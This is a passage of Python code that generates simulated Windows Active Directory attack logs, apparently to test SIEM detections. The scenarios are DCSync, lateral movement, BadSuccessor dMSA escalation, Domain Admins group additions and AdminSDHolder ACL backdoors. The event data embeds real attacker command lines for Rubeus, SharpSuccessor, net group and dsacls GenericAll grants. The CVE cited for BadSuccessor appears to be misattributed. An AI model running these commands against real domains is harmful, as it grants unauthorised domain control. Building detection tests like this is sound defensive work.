            u, config,
            object_type="%{bf967aba-0de6-11d0-a285-00aa003049e2}",
            object_name=obj,
            access_mask="0x100",
            properties=props,
            operation_type="Object Access",
            logon_id=logon_id, ts=t)))
        t += random.uniform(0.2, 0.5)

    events.append(json.dumps(_build_4689(u, config,
                                         process_name="C:\\Users\\Public\\mimikatz.exe",
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_priv_group_then_dcsync(config, session_context):
    """Privileged group addition followed by DCSync by the same actor.

    Returns the combined event list so the grant and the subsequent
    replication can be correlated.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    # Build a minimal session context that prefers this user
    ctx = session_context or {}
    # Call both generators; they each pick a user, so we accept the natural
    # correlation on username if they happen to match, otherwise just chain them.
    g = _threat_priv_group_addition(config, session_context)
    d = _threat_dcsync(config, session_context)
    events = []
    if g:
        events.extend(g if isinstance(g, list) else [g])
    if d:
        events.extend(d if isinstance(d, list) else [d])
    return events if events else None


def _threat_lateral_movement_chain(config, session_context):
    """Multi-hop lateral movement: attacker chains through 3+ hosts using
    a mix of PTH, RDP, and service ticket requests.

    Sequence (A→B→C→D):
      1. Attacker on Host-A uses PtH (4648+4776+4624 type 3) to reach Host-B
      2. From Host-B, requests TGS for Host-C (4769) + 4624 type 3 on Host-C
      3. From Host-C, requests TGS for Host-D (4769) + 4624 type 3 on Host-D
      4. Each hop leaves a DC-side 4624 + 4672 trail

    Detection keys:
      - Same TargetUserName appearing in 4624 type 3 across 3+ different
        ComputerNames in a short window (lateral spread)
      - IP address of each prior host appearing as source of next 4624
      - Rapid sequence of 4769 TGS requests for different host SPNs
      - KeyLength=0 + NTLM on the initial PTH hop
    """
    users = _get_windows_users(session_context)
    if len(users) < 4:
        return None

    attacker = random.choice(users)
    hops = random.sample([u for u in users if u["hostname"] != attacker["hostname"]],
                         k=min(3, len(users) - 1))
    events = []
    t = time.time()

    logon_id_0 = _new_logon_id()
    events.append(json.dumps(_build_4768(attacker, config, ts=t)))
    t += 1.0
    events.append(json.dumps(_dc_logon_event(attacker, config,
                                             ip_override=attacker.get("ip"),
                                             logon_id=logon_id_0, ts=t)))
    t += 1.2
    events.append(json.dumps(_build_4624(attacker, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id_0,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(attacker, config, logon_id=logon_id_0,
                                         is_admin=True, ts=t)))
    t += random.uniform(3, 8)

    current_ip = attacker.get("ip") or "10.0.0.1"

    for hop_target in hops:
        hop_logon_id = _new_logon_id()

        events.append(json.dumps(_build_4648(
            attacker, config,
            target_user=attacker["username"],
            target_server=hop_target["hostname"].split(".")[0],
            process_name="C:\\Windows\\System32\\cmd.exe",
            ip_override=current_ip, ts=t)))
        t += 1.0

        events.append(json.dumps(_build_4776(attacker, config, status="0x0",
                                             workstation=hop_target["hostname"],
                                             ts=t)))
        t += 0.8

        events.append(json.dumps(_dc_logon_event(attacker, config,
                                                 auth_pkg=_NTLM_PACKAGE_SHORT,
                                                 ip_override=current_ip,
                                                 logon_id=hop_logon_id, ts=t)))
        t += 0.5

        events.append(json.dumps(_build_4769(attacker, config,
                                             service_spn=f"cifs/{hop_target['hostname']}",
                                             ts=t)))
        t += 1.2

        ev = _build_4624(attacker, config, logon_type=3,
                         auth_pkg=_NTLM_PACKAGE_SHORT,
                         workstation_override=hop_target["hostname"],
                         ip_override=current_ip,
                         target_logon_id=hop_logon_id,
                         elevated=True, ts=t)
        ev["event_data"]["LogonProcessName"] = "NtLmSsp "
        ev["event_data"]["LmPackageName"] = "NTLM V2"
        ev["event_data"]["KeyLength"] = "0"
        events.append(json.dumps(ev))
        t += 0.05

        events.append(json.dumps(_build_4672(attacker, config,
                                             logon_id=hop_logon_id, ts=t)))
        t += random.uniform(3, 15)

        # Next hop source IP is the current target
        current_ip = hop_target.get("ip") or current_ip

    return events

_BENIGN_GENERATORS["lateral_movement"] = _threat_lateral_movement_chain
_BENIGN_GENERATORS = {k: _ending_by_now(v) for k, v in _BENIGN_GENERATORS.items()}


# dMSA privilege escalation targets — privileged accounts whose privileges
# the attacker inherits via msDS-ManagedAccountPrecededByLink
# These must be *accounts*. msDS-ManagedAccountPrecededByLink is a DN link to the
# superseded user/computer object, so a group DN ("Domain Admins") can never be
# superseded and leaves the detector with no identity to resolve.
_DMSA_TARGETS = [
    ("Administrator",  "CN=Administrator,CN=Users,{base_dn}"),
    ("krbtgt",         "CN=krbtgt,CN=Users,{base_dn}"),
]

# Schema GUIDs for the 4662 (Directory Service Access) footprint of a dMSA succession.
# XSIAM's "Possible Privilege Escalation using Delegated MSA account" is fed by 4662, not
# 5136: 5136 is not in XSIAM's WEC event-ID intake table, and the XSIAM 4662 setup topic
# requires a SACL on "Descendant msDS-DelegatedManagedServiceAccount Objects" purely for
# this detector. GUIDs published by Unit 42's BadSuccessor analysis.
_GUID_CLASS_DMSA                 = "{0feb936f-47b3-49f2-9386-1dedc2c23765}"
_GUID_ATTR_DELEGATED_MSA_STATE   = "{2f5c138a-bd38-4016-88b4-0ec87cbb4919}"
_GUID_ATTR_MANAGED_ACCT_PRECEDED = "{a0945b2b-57a2-43bd-b327-4d112a4e8bd1}"

_DMSA_NAMES = [
    "svc-backup-dmsa", "svc-monitor-dmsa", "svc-deploy-dmsa",
    "svc-replication-dmsa", "svc-scanner-dmsa", "svc-audit-dmsa",
]

_DMSA_ATTACK_TOOLS = [
    ("C:\\Users\\Public\\SharpSuccessor.exe",
     'SharpSuccessor.exe add /impersonate:{target} /path:"{ou}" /name:{dmsa_name}'),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     'powershell.exe -ep bypass -c "Import-Module .\\BadSuccessor.ps1; '
     'Invoke-BadSuccessor -TargetAccount {target} -dMSAName {dmsa_name} -OUPath \'{ou}\'"'),
]


def _threat_dmsa_privesc(config, session_context):
    """dMSA (BadSuccessor) privilege escalation: attacker creates a delegated
    Managed Service Account and sets msDS-ManagedAccountPrecededByLink to
    point at a privileged account, inheriting its privileges.

    CVE-2025-21293 — requires CreateChild on target OU, works in default
    Windows Server 2025 AD configurations.

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 SharpSuccessor/PowerShell process creation
      3. 4741 Computer account created (dMSA is a computer-class object)
      4. 5137 Directory service object created (the dMSA)
      5. 5136 ×5 Directory service modifications (correlated by OpCorrelationID):
         a. msDS-DelegatedMSAState = 0 (initial)
         b. msDS-ManagedAccountPrecededByLink = {target DN} ← DETECTION TRIGGER
         c. msDS-ManagedPasswordInterval = 30
         d. msDS-DelegatedMSAState: 0 deleted → 2 added (migration complete)
         e. msDS-SupersededManagedAccountLink = {dMSA DN}
      6. 4688 Rubeus for TGT delegation + dMSA impersonation
      7. 4769 Kerberos TGS request (dMSA service ticket)
      8. 4689 ×2 Process exits

    Detection keys:
      - 5136 with AttributeLDAPDisplayName=msDS-ManagedAccountPrecededByLink
        from a non-service/non-admin account → XSIAM "Possible Privilege
        Escalation using Delegated MSA account"
      - 4741 creating msDS-DelegatedManagedServiceAccount computer object
      - OpCorrelationID ties all 5136 events into one atomic operation
      - Non-DC machine account performing dMSA succession
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)

    target_label, target_dn_template = random.choice(_DMSA_TARGETS)
    target_dn = target_dn_template.format(base_dn=base_dn)
    dmsa_name = random.choice(_DMSA_NAMES)
    dmsa_sam = f"{dmsa_name}$"
    dmsa_dns = f"{dmsa_name}.{dns_domain}"
    dmsa_dn = f"CN={dmsa_name},OU=Servers,{base_dn}"
    dmsa_guid = _new_logon_guid()
    dmsa_sid = _stable_user_sid(dmsa_name)
    ou_path = f"OU=Servers,{base_dn}"

    tool_path, cmd_template = random.choice(_DMSA_ATTACK_TOOLS)
    cmd_line = cmd_template.format(target=target_label, dmsa_name=dmsa_name, ou=ou_path)

    events = []
    t = time.time()

    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    # 1. DC-side logon for Kerberos auth
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0

    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05

    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 8.0)

    events.append(json.dumps(_build_4688(u, config,
                                         process_name=tool_path,
                                         command_line=cmd_line,
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)

    # 5. Computer account created (dMSA object)
    events.append(json.dumps(_build_4741(u, config,
                                         target_computer_name=dmsa_sam,
                                         target_sid=dmsa_sid,
                                         sam_account_name=dmsa_sam,
                                         dns_host_name=dmsa_dns,
                                         spns=f"HOST/{dmsa_dns} RestrictedKrbHost/{dmsa_dns} HOST/{dmsa_name.upper()} RestrictedKrbHost/{dmsa_name.upper()}",
                                         new_uac_value="0x1000",
                                         logon_id=logon_id, ts=t)))
    t += 0.02

    # 6. Directory service object created (dMSA)
    events.append(json.dumps(_build_5137(u, config,
                                         object_dn=dmsa_dn,
                                         object_class="msDS-DelegatedManagedServiceAccount",
                                         object_guid=dmsa_guid,
                                         op_correlation_id=op_corr_id,
                                         logon_id=logon_id, ts=t)))
    t += 0.01

    # 7. 4662: write-property on the dMSA object — THE detection trigger. XSIAM consumes
    #    4662 (Audit Directory Service Access) for dMSA succession; the 5136 events below
    #    are corroboration only and are not in XSIAM's analytics intake.
    dmsa_link_props = (f"{_GUID_CLASS_DMSA}\n    "
                       f"{_GUID_ATTR_MANAGED_ACCT_PRECEDED}\n")
    events.append(json.dumps(_build_4662(u, config,
                                         object_type="%" + _GUID_CLASS_DMSA,
                                         object_name=dmsa_dn,
                                         access_mask="0x20",
                                         properties=dmsa_link_props,
                                         logon_id=logon_id, ts=t)))
    t += 0.01

    # 7a. 5136: msDS-DelegatedMSAState = 0 (initial state)
    events.append(json.dumps(_build_5136(u, config,
                                         object_dn=dmsa_dn,
                                         object_class="msDS-DelegatedManagedServiceAccount",
                                         object_guid=dmsa_guid,
                                         attribute_name="msDS-DelegatedMSAState",
                                         attribute_value="0",
                                         attribute_syntax_oid="2.5.5.9",
                                         operation_type="%%14674",
                                         op_correlation_id=op_corr_id,
                                         logon_id=logon_id, ts=t)))
    t += 0.01

    # 7b. 5136: msDS-ManagedAccountPrecededByLink = target DN ← KEY DETECTION TRIGGER
    events.append(json.dumps(_build_5136(u, config,
                                         object_dn=dmsa_dn,
                                         object_class="msDS-DelegatedManagedServiceAccount",
                                         object_guid=dmsa_guid,
                                         attribute_name="msDS-ManagedAccountPrecededByLink",
                                         attribute_value=target_dn,
                                         attribute_syntax_oid="2.5.5.1",
                                         operation_type="%%14674",
                                         op_correlation_id=op_corr_id,
                                         logon_id=logon_id, ts=t)))
    t += 0.01

    # 7c. 5136: msDS-ManagedPasswordInterval = 30
    events.append(json.dumps(_build_5136(u, config,
                                         object_dn=dmsa_dn,
                                         object_class="msDS-DelegatedManagedServiceAccount",
                                         object_guid=dmsa_guid,
                                         attribute_name="msDS-ManagedPasswordInterval",
                                         attribute_value="30",
                                         attribute_syntax_oid="2.5.5.9",
                                         operation_type="%%14674",
                                         op_correlation_id=op_corr_id,
                                         logon_id=logon_id, ts=t)))
    t += 0.01

    # 7d. 5136: msDS-DelegatedMSAState: delete 0, add 2 (migration complete)
    events.append(json.dumps(_build_5136(u, config,
                                         object_dn=dmsa_dn,
                                         object_class="msDS-DelegatedManagedServiceAccount",
                                         object_guid=dmsa_guid,
                                         attribute_name="msDS-DelegatedMSAState",
                                         attribute_value="0",
                                         attribute_syntax_oid="2.5.5.9",
                                         operation_type="%%14675",
                                         op_correlation_id=op_corr_id,
                                         logon_id=logon_id, ts=t)))
    t += 0.005
    events.append(json.dumps(_build_5136(u, config,
                                         object_dn=dmsa_dn,
                                         object_class="msDS-DelegatedManagedServiceAccount",
                                         object_guid=dmsa_guid,
                                         attribute_name="msDS-DelegatedMSAState",
                                         attribute_value="2",
                                         attribute_syntax_oid="2.5.5.9",
                                         operation_type="%%14674",
                                         op_correlation_id=op_corr_id,
                                         logon_id=logon_id, ts=t)))
    t += 0.01

    # 7d-bis. 4662: write-property flipping msDS-DelegatedMSAState to 2 ("migration
    #         complete") — Unit 42's BadSuccessor analysis shows this as a distinct 4662
    #         from the link write. Shares logon_id so the 4741<->4662<->4624
    #         SubjectLogonId join they describe holds.
    dmsa_state_props = (f"{_GUID_CLASS_DMSA}\n    "
                        f"{_GUID_ATTR_DELEGATED_MSA_STATE}\n")
    events.append(json.dumps(_build_4662(u, config,
                                         object_type="%" + _GUID_CLASS_DMSA,
                                         object_name=dmsa_dn,
                                         access_mask="0x20",
                                         properties=dmsa_state_props,
                                         logon_id=logon_id, ts=t)))
    t += 0.01

    # 7e. 5136: msDS-SupersededManagedAccountLink on the target (points back to dMSA)
    events.append(json.dumps(_build_5136(u, config,
                                         object_dn=target_dn,
                                         object_class="user",
                                         object_guid=_new_logon_guid(),
                                         attribute_name="msDS-SupersededManagedAccountLink",
                                         attribute_value=dmsa_dn,
                                         attribute_syntax_oid="2.5.5.1",
                                         operation_type="%%14674",
                                         op_correlation_id=op_corr_id,
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 2.0)

    # 8. Rubeus TGT delegation + dMSA impersonation
    events.append(json.dumps(_build_4688(u, config,
                                         process_name="C:\\Users\\Public\\Rubeus.exe",
                                         command_line="Rubeus.exe tgtdeleg /nowrap",
                                         parent_process=tool_path,
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.3, 1.0)

    # 9. Kerberos TGS request — dMSA requesting service ticket (impersonation)
    events.append(json.dumps(_build_4769(u, config,
                                         service_spn=f"krbtgt/{dns_domain.upper()}",
                                         encryption="0x12",
                                         ip_override=u.get("ip"),
                                         ts=t)))
    t += random.uniform(0.5, 1.5)

    # 10. Process exits
    events.append(json.dumps(_build_4689(u, config,
                                         process_name="C:\\Users\\Public\\Rubeus.exe",
                                         logon_id=logon_id, ts=t)))
    t += 0.01
    events.append(json.dumps(_build_4689(u, config,
                                         process_name=tool_path,
                                         logon_id=logon_id, ts=t)))

    return events


def _threat_machine_account_to_domain_admins(config, session_context):
    """A MACHINE account is added to Domain Admins — XSIAM rule 3c3c9d51.

    Deterministic by design. _threat_priv_group_addition can produce this shape, but only
    when its random draw picks a machine account (60%) AND lands on Domain Admins rather
    than Enterprise Admins — roughly a coin flip per fire. That is why the alert appeared
    intermittently and then not at all: it was incidental, never targeted. Here the member
    is always a machine account and the group is always Domain Admins.

    Live reference (alerts 458206 / 458606):
      "The machine account YOURPC03 was added to a group with Domain Admins privileges
       by the user examplecorp\\a.tucker."

    Sequence:
      1. Attacker authenticates -> DC-side 4624 + endpoint 4624 + 4672
      2. 4688 net.exe / PowerShell group manipulation
      3. 4728 machine account added to Domain Admins (global group -> 4728)
      4. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    victim = _pick_windows_user(session_context)
    if not victim or victim["username"] == u["username"]:
        victim = _pick_windows_user(session_context)
    if not victim:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))

    # The member is ALWAYS a machine account — that is the whole point of this detection.
    machine_host = victim.get("hostname") or "WKS001"
    machine_short = machine_host.split(".")[0].upper()
    machine_sam = f"{machine_short}$"
    member_dn = f"CN={machine_short},CN=Computers,{base_dn}"
    member_sid = _stable_user_sid(machine_sam)

    grp = _PRIVILEGED_GROUPS["Domain Admins"]

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         f'net group "Domain Admins" {machine_sam} /add /domain'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Add-ADGroupMember -Identity \'Domain Admins\' '
         f'-Members \'{machine_sam}\'"'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Get-ADComputer {machine_short} | '
         f'Add-ADPrincipalGroupMembership -MemberOf \'Domain Admins\'"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    # _build_4728 derives TargetDomainName itself; it takes no target_domain kwarg.
    events.append(json.dumps(_build_4728(u, config,
                                         member_name=member_dn,
                                         member_sid=member_sid,
                                         target_group="Domain Admins",
                                         target_sid=grp["sid"],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_priv_group_addition(config, session_context):
    """Machine or user account added to a privileged AD group (Domain Admins,
    Enterprise Admins, or Builtin Administrators).

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 net.exe / PowerShell process creation (group manipulation)
      3. 4728/4732/4756 member added to privileged group (DC event)
         — event ID depends on group scope (global/local/universal)
      4. 4689 process exit

    Detection keys:
      - 4728 with TargetUserName="Domain Admins" and MemberName containing
        a machine account ($) or non-admin user → immediate alert
      - SubjectUserName performing the add is a regular user, not a DC$ account
      - XSIAM rule: "Machine account was added to a domain admins group"
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)

    # Domain-scoped groups only. Builtin\Administrators (S-1-5-32-544 / "Builtin") does
    # not resolve as a domain privileged group and fires nothing — this generator's
    # "verified working" status rested on runs that happened to draw a domain group, so
    # the unrestricted draw made an already-passing detection intermittently regress.
    # See _threat_priv_group_add_remove for the supporting A/B evidence.
    group_name = random.choice(["Domain Admins", "Enterprise Admins"])
    group_info = _PRIVILEGED_GROUPS[group_name]

    is_machine = random.random() < 0.6
    if is_machine:
        victim_name = random.choice([
            "YOURPC01$", "YOURPC02$", "WKS-TEMP$", "YOURPC03$",
            u["hostname"].split(".")[0].upper() + "$",
        ])
        victim_dn = f"CN={victim_name.rstrip('$')},CN=Computers,{base_dn}"
    else:
        victim = _pick_windows_user(session_context)
        if not victim or victim["username"] == u["username"]:
            victim = _pick_windows_user(session_context)
        if not victim or victim["username"] == u["username"]:
            return None
        victim_name = victim["username"]
        victim_dn = f"CN={victim_name},CN=Users,{base_dn}"
    victim_sid = _stable_user_sid(victim_name)

    events = []
    t = time.time()

    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         f'net group "{group_name}" {victim_name} /add /domain'),
        ("C:\\Windows\\System32\\net.exe",
         f'net localgroup "{group_name}" {victim_name} /add /domain'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Add-ADGroupMember -Identity \'{group_name}\' '
         f'-Members \'{victim_name}\'"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    eid = group_info["event_id"]
    if eid == 4728:
        events.append(json.dumps(_build_4728(u, config,
                                             member_name=victim_dn,
                                             member_sid=victim_sid,
                                             target_group=group_name,
                                             target_sid=group_info["sid"],
                                             logon_id=logon_id, ts=t)))
    elif eid == 4732:
        events.append(json.dumps(_build_4732(u, config,
                                             member_name=victim_dn,
                                             member_sid=victim_sid,
                                             target_group=group_name,
                                             target_sid=group_info["sid"],
                                             logon_id=logon_id, ts=t)))
    elif eid == 4756:
        events.append(json.dumps(_build_4756(u, config,
                                             member_name=victim_dn,
                                             member_sid=victim_sid,
                                             target_group=group_name,
                                             target_sid=group_info["sid"],
                                             logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# Authoritative AD schema GUIDs.
#   container class -> MS-ADSC "Class container", schemaIdGuid
#   nTSecurityDescriptor attribute -> MS-ADA3, schemaIdGuid
_GUID_CLASS_CONTAINER           = "{bf967a8b-0de6-11d0-a285-00aa003049e2}"
_GUID_ATTR_NTSECURITYDESCRIPTOR = "{bf9679e3-0de6-11d0-a285-00aa003049e2}"


def _threat_adminsdholder_acl_modification(config, session_context):
    """AdminSDHolder ACL modification: attacker writes a new ACE to the
    AdminSDHolder object's nTSecurityDescriptor, granting themselves (or a
    controlled account) full-control rights that SDProp will propagate to
    every protected group (Domain Admins, Enterprise Admins, etc.) within
    60 minutes.

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 PowerShell / dsacls.exe process creation (ACL manipulation)
      3. 4662 Directory Service Access on AdminSDHolder with WRITE_DACL
      4. 5136 nTSecurityDescriptor modified on AdminSDHolder (the detection trigger)
      5. 4689 process exit

    Detection keys:
      - 5136 with ObjectDN containing CN=AdminSDHolder,CN=System and
        AttributeLDAPDisplayName=nTSecurityDescriptor from a non-service account
      - 4662 with ObjectName=CN=AdminSDHolder,CN=System and
        AccessMask=0x40000 (WRITE_DACL) from a regular user
      - SubjectUserName is NOT a DC$ machine account or SYSTEM
      - XSIAM rule: "Suspicious modification of the AdminSDHolder's ACL"
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)
    adminsdholder_dn = f"CN=AdminSDHolder,CN=System,{base_dn}"
    # STABLE objectGUID, derived from the DN. A real AD object keeps one GUID for its
    # entire lifetime; this was uuid.uuid4() per fire, so every run presented XSIAM with a
    # brand-new object and no history could ever accumulate against AdminSDHolder itself.
    adminsdholder_guid = "{" + str(uuid.uuid5(uuid.NAMESPACE_DNS, adminsdholder_dn)) + "}"

    events = []
    t = time.time()

    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    attacker_sid = _stable_user_sid(u["username"])

    # Default AdminSDHolder security descriptor, written the way Windows' SDDL serializer
    # emits it: rights in canonical order CC DC LC SW RP WP DT LO CR SD RC WD WO — the
    # "full control" string detection content matches on. The previous version used
    # RPWPCRCCDCLCLORCWOWDSDDTSW, which is the ordering found in schema
    # defaultSecurityDescriptor strings, NOT serializer output, so an SDDL-diffing rule
    # would never classify the added ACE as a rights grant.
    #
    # The old descriptor also carried (OA;;CR;ab721a56-...;;BA) — the Exchange Receive-As
    # extended right, which is nonsense on AdminSDHolder. Real AdminSDHolder carries
    # Reset-Password (00299570-...) and Change-Password (ab721a53-...). The SACL is what
    # makes this object audited at all, which is why 5136 fires on it.
    base_dacl = (
        "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
        "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)"
        "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
        "(OA;;CR;00299570-246d-11d0-a768-00aa006e0529;;BA)"
        "(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)"
        "(A;;LCRPLORC;;;AU)"
        "(A;;LCRPLORC;;;ED)"
    )
    sacl = "S:(AU;SAFA;WDWOSDWPCCDCSW;;;WD)"
    attacker_ace = f"(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{attacker_sid})"
    base_sddl = f"O:DAG:DAD:P{base_dacl}{sacl}"
    new_sddl = f"O:DAG:DAD:P{base_dacl}{attacker_ace}{sacl}"

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "'
         f"$acl = Get-Acl 'AD:\\{adminsdholder_dn}'; "
         f"$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("
         f"[System.Security.Principal.SecurityIdentifier]'{attacker_sid}',"
         f"'GenericAll','Allow'); "
         f"$acl.AddAccessRule($ace); "
         f"Set-Acl 'AD:\\{adminsdholder_dn}' $acl\""),
        ("C:\\Windows\\System32\\dsacls.exe",
         f'dsacls.exe "{adminsdholder_dn}" /G {domain}\\{u["username"]}:GA'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "Import-Module ActiveDirectory; '
         f"$path = 'AD:\\{adminsdholder_dn}'; "
         f"$acl = Get-Acl $path; "
         f"$user = '{domain}\\{u['username']}'; "
         f"$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("
         f"(New-Object System.Security.Principal.NTAccount($user)),"
         f"'GenericAll','Allow'); "
         f'$acl.AddAccessRule($ace); Set-Acl $path $acl"'),
    ])

    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    # ── Recon first: read the ACL before rewriting it. dsacls and Get-Acl both do this,
    #    and it gives the detector a read -> write progression on the same object.
    read_props = f"%%7684\n    {_GUID_CLASS_CONTAINER}\n"
    events.append(json.dumps(_build_4662(
        u, config,
        object_type=f"%{_GUID_CLASS_CONTAINER}",
        object_name=adminsdholder_dn,
        access_mask="0x10",
        properties=read_props,
        operation_type="Object Access",
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.2, 0.6)

    # 4662 — WRITE_DAC on the AdminSDHolder container.
    # ObjectName MUST be the distinguished name. That is how Microsoft defines the field
    # ("distinguished name of the object that was accessed"), it is what MS's monitoring
    # guidance for 4662 says to match on for this object, and it is what the working
    # DCSync generator emits. The previous code passed "%{uuid4()}" — a GUID minted fresh
    # every fire, resolving to nothing tenant-side — so the 4662 leg was inert by
    # construction and the string "AdminSDHolder" never appeared in it at all.
    write_dacl_props = f"%%1539\n    {_GUID_CLASS_CONTAINER}\n"
    events.append(json.dumps(_build_4662(
        u, config,
        object_type=f"%{_GUID_CLASS_CONTAINER}",
        object_name=adminsdholder_dn,
        access_mask="0x40000",
        properties=write_dacl_props,
        operation_type="Object Access",
        logon_id=logon_id, ts=t)))
    t += 0.05

    # 4662 — the nTSecurityDescriptor property write that accompanies the DACL change
    # (dsacls and Set-Acl both emit this alongside the WRITE_DAC).
    write_prop_props = (f"%%7685\n    {_GUID_CLASS_CONTAINER}\n    "
                        f"{_GUID_ATTR_NTSECURITYDESCRIPTOR}\n")
    events.append(json.dumps(_build_4662(
        u, config,
        object_type=f"%{_GUID_CLASS_CONTAINER}",
        object_name=adminsdholder_dn,
        access_mask="0x20",
        properties=write_prop_props,
        operation_type="Object Access",
        logon_id=logon_id, ts=t)))
    t += 0.05

    # 5136 pair: %%14675 (old SDDL deleted) then %%14674 (new SDDL added)
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=adminsdholder_dn,
        object_class="container",
        object_guid=adminsdholder_guid,
        attribute_name="nTSecurityDescriptor",
        attribute_value=base_sddl,
        attribute_syntax_oid="2.5.5.15",
        operation_type="%%14675",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.001
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=adminsdholder_dn,
        object_class="container",
        object_guid=adminsdholder_guid,
        attribute_name="nTSecurityDescriptor",
        attribute_value=new_sddl,
        attribute_syntax_oid="2.5.5.15",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))

    # ── SDProp propagation: the reason this attack matters ──────────────────────────
    # Within 60 minutes the Security Descriptor Propagator on the PDC emulator copies
    # AdminSDHolder's DACL onto every protected principal (adminCount=1), which is how a
    # single ACL write becomes durable control over every privileged account. Without it
    # the generator tells half the story: an ACL edit with no consequence.
    #
    # These writes are performed by the DC machine account, NOT the attacker — that is
    # what SDProp is. The attacker's ACE rides along in every propagated descriptor,
    # which is what ties the propagation back to the original modification.
